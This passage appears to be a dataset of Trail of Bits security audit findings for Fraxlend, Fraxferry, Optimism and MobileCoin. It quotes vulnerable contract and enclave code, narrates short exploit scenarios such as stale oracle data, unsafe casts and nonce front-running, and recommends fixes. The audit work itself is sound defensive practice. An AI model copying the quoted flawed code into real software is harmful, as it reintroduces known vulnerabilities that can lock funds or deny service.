// Write oracleData to storage oracleMultiply = _oracleMultiply; oracleDivide = _oracleDivide; oracleNormalization = _oracleNormalization; Figure 2.2: The constructor functions body in FraxlendPairCore.sol#L201-L214 Exploit Scenario Bob deploys a custom pair with a miscongured _configData argument in which no oracle is set. As a consequence, the exchange rate is incorrect. Recommendations Short term, add an upper limit check for the _liquidationFee parameter, and add a check for the _configData parameter to ensure that at least one oracle is set. The checks can be added in either the FraxlendPairCore contract or the FraxlendPairDeployer contract. Long term, add appropriate requirements to values that users set to decrease the likelihood of user error.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "3. Incorrect application of penalty fee rate ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "A Fraxlend pair can have a maturity date, after which a penalty rate is applied to the interest to be paid by the borrowers. However, the penalty rate is also applied to the amount of time immediately before the maturity date. As shown in gure 3.1, the _addInterest function checks whether a pair is past maturity. If it is, the function sets the new rate (the _newRate parameter) to the penalty rate (the penaltyRate parameter) and then uses it to calculate the matured interest. The function should apply the penalty rate only to the time between the maturity date and the current time; however, it also applies the penalty rate to the time between the last interest accrual ( _deltaTime ) and the maturity date, which should be subject only to the normal interest rate. function _addInterest () // [...] uint256 _deltaTime = block.timestamp - _currentRateInfo.lastTimestamp; // [...] if (_isPastMaturity()) { _newRate = uint64 (penaltyRate); } else { // [...] // Effects: bookkeeping _currentRateInfo.ratePerSec = _newRate; _currentRateInfo.lastTimestamp = uint64 ( block.timestamp ); _currentRateInfo.lastBlock = uint64 ( block.number ); // Calculate interest accrued _interestEarned = (_deltaTime * _totalBorrow.amount * _currentRateInfo.ratePerSec) / 1e18; Figure 3.1: The _addInterest function in FraxlendPairCore.sol#L406-L494 Exploit Scenario A Fraxlend pairs maturity date is 100, the delta time (the last time interest accrued) is 90, and the current time is 105. Alice decides to repay her debt. The _addInterest function is executed, and the penalty rate is also applied to the interest accrual and the maturity date. As a result, Alice owes more in interest than she should. Recommendations Short term, modify the associated code so that if the _isPastMaturity branch is taken and the _currentRateInfo.lastTimestamp value is less than maturityDate value, the penalty interest rate is applied only for the amount of time after the maturity date. Long term, identify edge cases that could occur in the interest accrual process and implement unit tests and fuzz tests to validate them.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "4. Improper validation of Chainlink data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "The current validation of the values returned by Chainlinks latestRoundData function could result in the use of stale data. The latestRoundData function returns the following values: the answer , the roundId (which represents the current round), the answeredInRound value (which corresponds to the round in which the answer was computed), and the updatedAt value (which is the timestamp of when the round was updated). An updatedAt value of zero means that the round is not complete and should not be used. An answeredInRound value that is less than the roundId could indicate stale data. However, the _updateExchangeRate function does not check for these conditions. function _updateExchangeRate () internal returns ( uint256 _exchangeRate ) { // [...] uint256 _price = uint256 (1e36); if (oracleMultiply != address ( 0 )) { (, int256 _answer , , , ) = AggregatorV3Interface(oracleMultiply).latestRoundData(); if (_answer <= 0 ) { revert OracleLTEZero(oracleMultiply); } _price = _price * uint256 (_answer); } if (oracleDivide != address ( 0 )) { (, int256 _answer , , , ) = AggregatorV3Interface(oracleDivide).latestRoundData(); if (_answer <= 0 ) { revert OracleLTEZero(oracleDivide); } _price = _price / uint256 (_answer); } // [...] } Figure 4.1: The _updateExchangeRate function in FraxlendPairCore.sol#L513-L544 Exploit Scenario Chainlink is not updated correctly in the current round, and Eve, who should be liquidated with the real collateral asset price, is not liquidated because the price reported is outdated and is higher than it is in reality. Recommendations Short term, have _updateExchangeRate perform the following sanity check: require(updatedAt != 0 && answeredInRound == roundId) . This check will ensure that the round has nished and that the pricing data is from the current round. Long term, when integrating with third-party protocols, make sure to accurately read their documentation and implement the appropriate sanity checks.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "5. Risk of oracle outages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "Under extreme market conditions, the Chainlink oracle may cease to work as expected, causing unexpected behavior in the Fraxlend protocol. Such oracle issues have occurred in the past. For example, during the LUNA market crash, the Venus protocol was exploited because Chainlink stopped providing up-to-date prices. The interruption occurred because the price of LUNA dropped below the minimum price ( minAnswer ) allowed by the LUNA/USD price feed on the BNB chain. As a result, all oracle updates reverted. Chainlinks automatic circuit breakers , which will pause price feeds during extreme market conditions, could pose similar problems. Note that these kinds of events cannot be tracked on-chain. If a price feed is paused, updatedAt will still be greater than zero, and answeredInRound will still be equal to roundId . Therefore, the Frax Finance team should implement an o-chain monitoring solution to detect any anomalous behavior exhibited by Chainlink oracles. Recommendations Short term, implement an o-chain monitoring solution that checks for the following conditions and issues alerts if they occur, as they may be indicative of abnormal market events:    An asset price that is approaching the minAnswer or maxAnswer value The suspension of a price feed by an automatic circuit breaker Any large deviations in the price of an asset", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Unapproved lenders could receive fTokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "A Fraxlend custom pair can include a list of approved lenders; these are the only lenders who can deposit the underlying asset into the given pair and receive the corresponding fTokens. However, the system does not perform checks when users transfer fTokens; as a result, approved lenders could send fTokens to unapproved addresses. Although unapproved addresses can only redeem fTokens sent to themmeaning this issue is not security-criticalthe ability for approved lenders to send fTokens to unapproved addresses conicts with the currently documented behavior. function deposit ( uint256 _amount , address _receiver ) external nonReentrant isNotPastMaturity whenNotPaused approvedLender(_receiver) returns ( uint256 _sharesReceived ) {...} Figure 6.1: The deposit function in FraxlendPairCore.sol#L587-L594 Exploit Scenario Bob, an approved lender, deposits 100 asset tokens and receives 90 fTokens. He then sends the fTokens to an unapproved address, causing other users to worry about the state of the protocol. Recommendations Short term, override the _beforeTokenTransfer function by applying the approvedLender modier to it. Alternatively, document the ability for approved lenders to send fTokens to unapproved addresses. Long term, when applying access controls to token owners, make sure to evaluate all the possible ways in which a token can be transferred and document the expected behavior.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "7. FraxlendPairDeployer cannot deploy contracts of fewer than 13,000 bytes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "The FraxlendPairDeployer contract, which is used to deploy new pairs, does not allow contracts that contain less than 13,000 bytes of code to be deployed. To deploy new pairs, users call the deploy or deployCustom function, which then internally calls _deployFirst . This function uses the create2 opcode to create a contract for the pair by concatenating the bytecode stored in contractAddress1 and contractAddress2 . The setCreationCode function, which uses solmates SSTORE2 library to store the bytecode for use by create2 , splits the bytecode into two separate contracts ( contractAddress1 and contractAddress2 ) if the _creationCode size is greater than 13,000. function setCreationCode ( bytes calldata _creationCode) external onlyOwner { bytes memory _firstHalf = BytesLib.slice(_creationCode, 0 , 13000 ); contractAddress1 = SSTORE2.write(_firstHalf); if (_creationCode.length > 13000 ) { bytes memory _secondHalf = BytesLib.slice(_creationCode, 13000 , _creationCode.length - 13000 ); contractAddress2 = SSTORE2.write(_secondHalf); } } Figure 7.1: The setCreationCode function in FraxlendPairDeployer.sol#L173-L180 The rst problem is that if the _creationCode size is less than 13,000, BytesLib.slice will revert with the slice_outOfBounds error, as shown in gure 7.2. function slice ( bytes memory _bytes, uint256 _start , uint256 _length ) internal pure returns ( bytes memory ) { require (_length + 31 >= _length, \"slice_overflow\" ); require (_bytes.length >= _start + _length, \"slice_outOfBounds\" ); Figure 7.2: The BytesLib.slice function from the solidity-bytes-utils library Assuming that the rst problem does not exist, another problem arises from the use of SSTORE2.read in the _deployFirst function (gure 7.3). If the creation code was less than 13,000 bytes, contractAddress2 would be set to address(0) . This would cause the SSTORE2.read functions pointer.code.length - DATA_OFFSET computation, shown in gure 7.4, to underow, causing the SSTORE2.read operation to panic. function _deployFirst ( // [...] ) private returns ( address _pairAddress ) { { // [...] bytes memory _creationCode = BytesLib.concat( SSTORE2.read(contractAddress1), SSTORE2.read(contractAddress2) ); Figure 7.3: The _deployFirst function in FraxlendPairDeployer.sol#L212-L231 uint256 internal constant DATA_OFFSET = 1 ; function read ( address pointer ) internal view returns ( bytes memory ) { return readBytecode(pointer, DATA_OFFSET, pointer.code.length - DATA_OFFSET ); } Figure 7.4: The SSTORE2.read function from the solmate library Exploit Scenario Bob, the FraxlendPairDeployer contracts owner, wants to set the creation code to be a contract with fewer than 13,000 bytes. When he calls setCreationCode , it reverts. Recommendations Short term, make the following changes:   In setCreationCode , in the line that sets the _firstHalf variable, replace 13000 in the third argument of BytesLib.slice with min(13000, _creationCode.length) . In _deployFirst , add a check to ensure that the SSTORE2.read(contractAddress2) operation executes only if contractAddress2 is not address(0) . Alternatively, document the fact that it is not possible to deploy contracts with fewer than 13,000 bytes. Long term, improve the projects unit tests and fuzz tests to check that the functions behave as expected and cannot unexpectedly revert.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "8. setCreationCode fails to overwrite _secondHalf slice if updated code size is less than 13,000 bytes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "The setCreationCode function permits the owner of FraxlendPairDeployer to set the bytecode that will be used to create contracts for newly deployed pairs. If the _creationCode size is greater than 13,000 bytes, it will be split into two separate contracts ( contractAddress1 and contractAddress2 ). However (assuming that TOB-FXLEND-7 were xed), if a FraxlendPairDeployer owner were to change the creation code from one of greater than 13,000 bytes to one of fewer than 13,000 bytes, contractAddress2 would not be reset to address(0) ; therefore, contractAddress2 would still contain the second half of the previous creation code. function setCreationCode ( bytes calldata _creationCode) external onlyOwner { bytes memory _firstHalf = BytesLib.slice(_creationCode, 0 , 13000 ); contractAddress1 = SSTORE2.write(_firstHalf); if (_creationCode.length > 13000 ) { bytes memory _secondHalf = BytesLib.slice(_creationCode, 13000 , _creationCode.length - 13000 ); contractAddress2 = SSTORE2.write(_secondHalf); } } Figure 8.1: The setCreationCode function in FraxlendPairDeployer.sol#L173-L180 Exploit Scenario Bob, FraxlendPairDeployer s owner, changes the creation code from one of more than 13,000 bytes to one of less than 13,000 bytes. As a result, deploy and deployCustom deploy contracts with unexpected bytecode. Recommendations Short term, modify the setCreationCode function so that it sets contractAddress2 to address(0) at the beginning of the function . Long term, improve the projects unit tests and fuzz tests to check that the functions behave as expected and cannot unexpectedly revert.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "9. Missing checks in setter functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "The setFee and setMinWaitPeriods functions do not have appropriate checks. First, the setFee function does not have an upper limit, which means that the Fraxferry owner can set enormous fees. Second, the setMinWaitPeriods function does not require the new value to be at least one hour. A minimum waiting time of less than one hour would invalidate important safety assumptions. For example, in the event of a reorganization on the source chain, the minimum one-hour waiting time ensures that only transactions after the reorganization are ferried (as described in the code comment in gure 9.1). ** - Reorgs on the source chain. Avoided, by only returning the transactions on the source chain that are at least one hour old. ** - Rollbacks of optimistic rollups. Avoided by running a node. ** - Operators do not have enough time to pause the chain after a fake proposal. Avoided by requiring a minimal amount of time between sending the proposal and executing it. // [...] function setFee ( uint _FEE ) external isOwner { FEE=_FEE; emit SetFee(_FEE); } function setMinWaitPeriods ( uint _MIN_WAIT_PERIOD_ADD , uint _MIN_WAIT_PERIOD_EXECUTE ) external isOwner { MIN_WAIT_PERIOD_ADD=_MIN_WAIT_PERIOD_ADD; MIN_WAIT_PERIOD_EXECUTE=_MIN_WAIT_PERIOD_EXECUTE; emit SetMinWaitPeriods(_MIN_WAIT_PERIOD_ADD, _MIN_WAIT_PERIOD_EXECUTE); } Figure 9.1: The setFee and setMinWaitPeriods functions in Fraxferry.sol#L226-L235 Exploit Scenario Bob, Fraxferry s owner, calls setMinWaitPeriods with a _MIN_WAIT_PERIOD_ADD value lower than 3,600 (one hour) , invalidating the waiting periods protection regarding chain reorganizations. Recommendations Short term, add an upper limit check to the setFee function; add a check to the setMinWaitPeriods function to ensure that _MIN_WAIT_PERIOD_ADD and _MIN_WAIT_PERIOD_EXECUTE are at least 3,600 (one hour). Long term, make sure that conguration variables can be set only to valid values.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Risk of invalid batches due to unsafe cast in depart function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "The depart function performs an unsafe cast operation that could result in an invalid batch. Users who want to send tokens to a certain chain use the various embark* functions. These functions eventually call embarkWithRecipient , which adds the relevant transactions to the transactions array. function embarkWithRecipient ( uint amount , address recipient ) public notPaused { // [...] transactions.push(Transaction(recipient,amountAfterFee, uint32 ( block.timestamp ))); } Figure 10.1: The embarkWithRecipient function in Fraxferry.sol#L127-L135 At a certain point, the captain role calls depart with the start and end indices within transactions to specify the transactions inside of a batch. However, the depart function performs an unsafe cast operation when creating the new batch; because of this unsafe cast operation, an end value greater than 2 ** 64 would be cast to a value lower than the start value, breaking the invariant that end is greater than or equal to start . function depart ( uint start , uint end , bytes32 hash ) external notPaused isCaptain { require ((batches.length== 0 && start== 0 ) || (batches.length> 0 && start==batches[batches.length- 1 ].end+ 1 ), \"Wrong start\" ); require (end>=start, \"Wrong end\" ); batches.push(Batch( uint64 (start), uint64 (end), uint64 ( block.timestamp ), 0 , hash )); emit Depart(batches.length- 1 ,start,end, hash ); } Figure 10.2: The depart function in Fraxferry.sol#L155-L160 If the resulting incorrect batch is not disputed by the crew member roles, which would cause the system to enter a paused state, the rst ocer role will call disembark to actually execute the transactions on the target chain. However, the disembark functions third check, highlighted in gure 10.3, on the invalid transaction will fail, causing the transaction to revert and the system to stop working until the incorrect batch is removed with a call to removeBatches . function disembark (BatchData calldata batchData) external notPaused isFirstOfficer { Batch memory batch = batches[executeIndex++]; require (batch.status== 0 , \"Batch disputed\" ); require (batch.start==batchData.startTransactionNo, \"Wrong start\" ); require (batch.start+batchData.transactions.length- 1 ==batch.end, \"Wrong size\" ); require ( block.timestamp -batch.departureTime>=MIN_WAIT_PERIOD_EXECUTE, \"Too soon\" ); // [...] } Figure 10.3: The disembark function in Fraxferry.sol#L162-L178 Exploit Scenario Bob, Fraxferry s captain, calls depart with an end value greater than 2 ** 64 , which is cast to a value less than start . As a consequence, the system becomes unavailable either because the crew members called disputeBatch or because the disembark function reverts. Recommendations Short term, replace the unsafe cast operation in the depart function with a safe cast operation to ensure that the end >= start invariant holds. Long term, implement robust unit tests and fuzz tests to check that important invariants hold.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "11. Transactions that were already executed can be canceled ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "The Fraxferry contracts owner can call the jettison or jettisonGroup functions to cancel a transaction or a series of transactions, respectively. However, these functions incorrectly use the executeIndex variable to determine whether the given transaction has already been executed. As a result, it is possible to cancel an already executed transaction. The problem is that executeIndex tracks executed batches, not executed transactions. Because a batch can contain more than one transaction, the check in the _jettison function (gure 11.1) does not work correctly. function _jettison ( uint index , bool cancel ) internal { require (index>=executeIndex, \"Transaction already executed\" ); cancelled[index]=cancel; emit Cancelled(index,cancel); } function jettison ( uint index , bool cancel ) external isOwner { _jettison(index,cancel); } function jettisonGroup ( uint [] calldata indexes, bool cancel ) external isOwner { for ( uint i = 0 ;i<indexes.length;++i) { _jettison(indexes[i],cancel); } } Figure 11.1: The _jettison , jettison , and jettisonGroup functions in Fraxferry.sol#L208-L222 Note that canceling a transaction that has already been executed does not cancel its eects (i.e., the tokens were already sent to the receiver). Exploit Scenario Two batches of 10 transactions are executed; executeIndex is now 2 . Bob, Fraxferry s owner, calls jettison with an index value of 13 to cancel one of these transactions. The call to jettison should revert, but it is executed correctly. The emitted Cancelled event shows that a transaction that had already been executed was canceled, confusing the o-chain monitoring system. Recommendations Short term, use a dierent index in the jettison and jettisonGroup functions to track executed transactions. Long term, implement robust unit tests and fuzz tests to check that important invariants hold.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "12. Lack of contract existence check on low-level call ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "The execute function includes a low-level call operation without a contract existence check; call operations return true even if the _to address is not a contract, so it is important to include contract existence checks alongside such operations. // Generic proxy function execute ( address _to , uint256 _value , bytes calldata _data) external isOwner returns ( bool , bytes memory ) { ( bool success , bytes memory result) = _to.call{value:_value}(_data); return (success, result); } Figure 12.1: The execute function in Fraxferry.sol#L274-L278 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 12.2: A snippet of the Solidity documentation detailing unexpected behavior related to call Exploit Scenario Bob, Fraxferry s owner, calls execute with _to set to an address that should be a contract; however, the contract was self-destructed. Even though the contract at this address no longer exists, the operation still succeeds. Recommendations Short term, implement a contract existence check before the call operation in the execute function. If the call operation is expected to send ETH to an externally owned address, ensure that the check is performed only if the _data.length is not zero. Long term, carefully review the Solidity documentation , especially the Warnings section.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "13. Events could be improved ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf", "body": "The events declared in the Fraxferry contract could be improved to be more useful to users and monitoring systems. Certain events could be more useful if they used the indexed keyword. For example, in the Embark event, the indexed keyword could be applied to the sender parameter. Additionally, SetCaptain , SetFirstOfficier , SetFee , and SetMinWaitPeriods could be more useful if they emitted the previous value in addition to the newly set one. event Embark ( address sender , uint index , uint amount , uint amountAfterFee , uint timestamp ); event Disembark ( uint start , uint end , bytes32 hash ); event Depart ( uint batchNo , uint start , uint end , bytes32 hash ); event RemoveBatch ( uint batchNo ); event DisputeBatch ( uint batchNo , bytes32 hash ); event Cancelled ( uint index , bool cancel ); event Pause ( bool paused ); event OwnerNominated ( address newOwner ); event OwnerChanged ( address previousOwner , address newOwner ); event SetCaptain ( address newCaptain ); event SetFirstOfficer ( address newFirstOfficer ); event SetCrewmember ( address crewmember , bool set ); event SetFee ( uint fee ); event SetMinWaitPeriods ( uint minWaitAdd , uint minWaitExecute ); Figure 13.1: Events declared in Fraxferry.sol#L83-L96 Recommendations Short term, add the indexed keyword to any events that could benet from it; modify events that report on setter operations so that they report the previous values in addition to the newly set values.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Risk of miscongured GasPriceOracle state variables that can lock L2 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-optimism-securityreview.pdf", "body": "When bootstrapping the L2 network operated by op-geth , the GasPriceOracle contract is pre-deployed to L2, and its contract state variables are used to specify the L1 costs to be charged on L2. Three state variables are used to compute the costs decimals , overhead , and scalar which can be updated through transactions sent to the node. However, these state variables could be miscongured in a way that sets gas prices high enough to prevent transactions from being processed. For example, if overhead were set to the maximum value, a 256-bit unsigned integer, the subsequent transactions would not be accepted. In an end-to-end test of the above example, contract bindings used in op-e2e tests (such as the GasPriceOracle bindings used to update the state variables) were no longer able to make subsequent transactions/updates, as calls to SetOverhead or SetDecimals resulted in a deadlock. Sending a transaction directly through the RPC client did not produce a transaction receipt that could be fetched. Recommendations Short term, implement checks to ensure that GasPriceOracle parameters can be updated if fee parameters were previously miscongured. This could be achieved by adding an exception to GasPriceOracle fees when the contract owner calls methods within the contract or by setting a maximum fee cap. Long term, develop operational procedures to ensure the system is not deployed in or otherwise entered into an unexpected state as a result of operator actions. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "1. Project contains vulnerable dependencies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "Running cargo-audit over the codebase revealed that the system under audit uses crates with Rust Security (RustSec) advisories and crates that are no longer maintained. RustSec ID", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "2. MobileCoin Foundation could infer token IDs in certain scenarios ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "The MobileCoin Foundation is the recipient of all transaction fees and, in certain scenarios, could infer the token ID used in one of multiple transactions included in a block. MCIP-0025 introduced the concept of condential token IDs. The rationale behind the proposal is to allow the MobileCoin network to support tokens other than MOB (MobileCoins native token) in the future. Doing so requires not only that these tokens be unequivocally identiable but also that transactions involving any token, MOB or otherwise, have the same condentiality properties. Before the introduction of the condential tokens feature, all transaction fees were aggregated by the enclave, which created a single transaction fee output per block; however, the same approach applied to a system that supports transfers of tokens other than MOB could introduce information leakage risks. For example, if two users submit two transactions with the same token ID, there would be a single transaction fee output, and therefore, both users would know that they transacted with the same token. To prevent such a leak of information, MCIP-0025 proposes the following: The number of transaction fee outputs on a block should always equal the minimum value between the number of token IDs and the number of transactions in that block (e.g., num_tx_fee_out = min(num_token_ids, num_transactions)). This essentially means that a block with a single transaction will still have a single transaction fee output, but a block with multiple transactions with the same token ID will have multiple transaction fee outputs, one with the aggregated fee and the others with a zero-value fee. Finally, it is worth mentioning that transaction fees are not paid in MOB but in the token that is being transacted; this creates a better user experience, as users do not need to own MOB to send tokens to other people. While this proposal does indeed preserve the condentiality requirement, it falls short in one respect: the receiver of all transaction fees in the MobileCoin network is the MobileCoin Foundation, meaning that it will always know the token ID corresponding to a transaction fee output. Therefore, if only a single token is used in a block, the foundation will know the token ID used by all of the transactions in that block. Exploit Scenario Alice and Bob use the MobileCoin network to make payments between them. They send each other multiple payments, using the same token, and their transactions are included in a single block. Eve, who has access to the MobileCoin Foundations viewing key, is able to decrypt the transaction fee outputs corresponding to that block and, because no other token was used inside the block, is able to infer the token that Alice and Bob used to make the payments. Recommendations Short term, document the fact that transaction token IDs are visible to the MobileCoin Foundation. Transparency on this issue will help users understand the information that is visible by some parties. Additionally, consider implementing the following alternative designs:  Require that all transaction fees be paid in MOB. This solution would result in a degraded user experience compared to the current design; however, it would address the issue at hand.  Aggregate fee outputs across multiple blocks. This solution would achieve only probabilistic condentiality of information because if all those blocks transact in the same token, the foundation would still be able to infer the ID. Long term, document the trade-os between allowing users to pay fees in the tokens they transact with and restricting fee payments to only MOB, and document how these trade-os could aect the condentiality of the system.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Token IDs are protected only by SGX ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "Token IDs are intended to be condential. However, they are operated on within an SGX enclave. This is an apparent departure from MobileCoins previous approach of using SGX as an additional security mechanism, not a primary one. Previously, most condential information in MobileCoin was protected by SGX and another security mechanism. Examples include the following:  A transactions senders, recipients, and amounts are protected by SGX and ring signatures.  The transactions a user interacts with through Fog are protected by both SGX and oblivious RAM. However, token IDs are protected by SGX alone. (An example in which a token ID is operated on within an enclave appears in gure 3.1.) Thus, the incorporation of condential tokens seems to represent a shift in MobileCoins security posture. let token_id = TokenId::from(tx.prefix.fee_token_id); let minimum_fee = ct_min_fees .get(&token_id) .ok_or(TransactionValidationError::TokenNotYetConfigured)?; Figure 3.1: consensus/enclave/impl/src/lib.rs#L239-L243 Exploit Scenario Mallory learns of a vulnerability that allows her to see inside of an SGX enclave. Mallory uses the vulnerability to observe the token IDs used in transactions in a MobileCoin enclave that she runs. Recommendations Short term, document the fact that token IDs are not oered the same level of security as other aspects of MobileCoin. This will help set users expectations regarding the condentiality of their information (i.e., whether it could be revealed to an attacker). Long term, continue to investigate solutions to the security problems surrounding the condential tokens feature. A solution that does not reveal token IDs to the enclave could exist.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Nonces are not stored per token ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "Mint and mint conguration transaction nonces are not distinguished by the tokens with which they are associated. Malicious minters or governors could use this fact to conduct denial-of-service attacks against other minters and governors. The relevant code appears in gures 4.1 and 4.2. For each type of transaction, nonces are inserted into a seen_nonces set without regard to the token indicated in the transaction. let mut seen_nonces = BTreeSet::default(); let mut validated_txs = Vec::with_capacity(mint_config_txs.len()); for tx in mint_config_txs { // Ensure all nonces are unique. if !seen_nonces.insert(tx.prefix.nonce.clone()) { return Err(Error::FormBlock(format!( \"Duplicate MintConfigTx nonce: {:?}\", tx.prefix.nonce ))); } Figure 4.1: consensus/enclave/impl/src/lib.rs#L342-L352 let mut mint_txs = Vec::with_capacity(mint_txs_with_config.len()); let mut seen_nonces = BTreeSet::default(); for (mint_tx, mint_config_tx, mint_config) in mint_txs_with_config { // The nonce should be unique. if !seen_nonces.insert(mint_tx.prefix.nonce.clone()) { return Err(Error::FormBlock(format!( \"Duplicate MintTx nonce: {:?}\", mint_tx.prefix.nonce ))); } Figure 4.2: consensus/enclave/impl/src/lib.rs#L384-L393 Note that the described attack could be made worse by how nonces are intended to be used. The following passage from the white paper suggests that nonces are generated deterministically from public data. Generating nonces in this way could make them easy for an attacker to predict. When submitting a MintTx, we include a nonce to protect against replay attacks, and a tombstone block to prevent the transaction from being nominated indenitely, and these are committed to the chain. (For example, in a bridge application, this nonce may be derived from records on the source chain, to ensure that each deposit on the source chain leads to at most one mint.) Exploit Scenario Mallory (a minter) learns that Alice (another minter) intends to submit a mint transaction with a particular nonce. Mallory submits a mint transaction with that nonce rst, making Alices invalid. Recommendations Short term, store nonces per token, instead of all together. Doing so will prevent the denial-of-service attack described above. Long term, when adding new data to blocks or to the blockchain conguration, carefully consider whether it should be stored per token. Doing so could help to prevent denial-of-service attacks.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Clients have no option for verifying blockchain conguration ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "Clients have no way to verify whether the MobileCoin node they connect to is using the correct blockchain conguration. This exposes users to attacks, as detailed in the white paper: Similarly to how the nodes ensure that they are similarly congured during attestation, (by mixing a hash of their conguration into the responder id used during attestation), the peer- to-node attestation channels could also do this, so that users can fail to attest immediately if malicious manipulation of conguration has occurred. The problem with this approach is that the users have no particularly good source of truth around the correct runtime conguration of the services. The problem that users have no particularly good source of truth could be solved by publishing the latest blockchain conguration via a separate channel (e.g., a publicly accessible server). Furthermore, allowing users to opt in to such additional checks would provide additional security to users who desire it. Exploit Scenario Alice falls victim to the attack described in the white paper. The attack would have been thwarted had Alice known that the node she connected to was not using the correct blockchain conguration. Recommendations Short term, make the current blockchain conguration publicly available, and allow nodes to attest to clients using their conguration. Doing so will help security-conscious users to better protect themselves. Long term, avoid withholding data from clients during attestation. Adopt a general principle that if data should be included in node-to-node attestation, then it should be included in node-to-client attestation as well. Doing so will help to ensure the security of users.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Condential tokens cannot support frequent price swings ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "The method for determining tokens minimum fees has limited applicability. In particular, it cannot support tokens whose prices change frequently. In principle, a tokens minimum fee should be comparable in value to the MOB minimum fee. Thus, if a tokens price increases relative to the price of MOB, the tokens minimum fee should decrease. Similarly, if a tokens price decreases relative to the price of MOB, the tokens minimum fee should increase. However, an enclave sets its fee map from the blockchain conguration during initialization (gure 6.1) and does not change the fee map thereafter. Thus, the enclave would seem to have to be restarted if its blockchain conguration and fee map were to change. This fact implies that the current setup cannot support tokens whose prices shift frequently. fn enclave_init( &self, peer_self_id: &ResponderId, client_self_id: &ResponderId, sealed_key: &Option<SealedBlockSigningKey>, blockchain_config: BlockchainConfig, ) -> Result<(SealedBlockSigningKey, Vec<String>)> { // Check that fee map is actually well formed FeeMap::is_valid_map(blockchain_config.fee_map.as_ref()).map_err(Error::FeeMap)?; // Validate governors signature. if !blockchain_config.governors_map.is_empty() { let signature = blockchain_config .governors_signature .ok_or(Error::MissingGovernorsSignature)?; let minting_trust_root_public_key = Ed25519Public::try_from(&MINTING_TRUST_ROOT__KEY[..]) .map_err(Error::ParseMintingTrustRootPublicKey)?; minting_trust_root_public_key .verify_governors_map(&blockchain_config.governors_map, &signature) .map_err(|_| Error::InvalidGovernorsSignature)?; } self.ct_min_fee_map .set(Box::new( blockchain_config.fee_map.as_ref().iter().collect(), )) .expect(\"enclave was already initialized\"); Figure 6.1: consensus/enclave/impl/src/lib.rs#L454-L483 Exploit Scenario MobileCoin integrates token T. The value of T decreases, but the minimum fee remains the same. Users pay the minimum fee, resulting in lost income to the MobileCoin Foundation. Recommendations Short term, accept only tokens with a history of price stability. Doing so will ensure that the new features are used only with tokens that can be supported. Long term, consider including two inputs in each transaction, one for the token transferred and one to pay the fee in MOB, as suggested in TOB-MCCT-2.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Overow handling could allow recovery of transaction token ID ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf", "body": "The systems fee calculation could overow a u64 value. When this occurs, the fee is divided up into multiple smaller fees, each tting into a u64 value. Under certain conditions, this behavior could be abused to reveal whether a token ID is used in a block. The relevant code appears in gure 7.1. The hypothetical attack is described 